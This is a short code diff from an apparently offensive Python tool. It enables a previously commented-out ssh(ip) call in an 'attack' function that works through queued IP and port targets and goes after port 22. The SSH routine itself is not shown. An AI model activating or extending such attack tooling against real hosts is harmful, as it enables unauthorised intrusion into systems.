@@ -113,8 +113,7 @@ def attack(q):
             ip, port = q.get().split(':')
             threadSafePrint(bcolors.OKCYAN , "!!!!!!!!!!!!!!!!!!!!!!!!  Trying to attack to ", ip, "on port ", port , "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" , bcolors.ENDC)
             if port.find("22") != -1:
-                # ssh(ip)
-                pass
+                ssh(ip)
             else:
                 threadSafePrint(bcolors.BOLD , bcolors.WARNING , "There is no supported port to connect to ", ip , bcolors.ENDC)
 
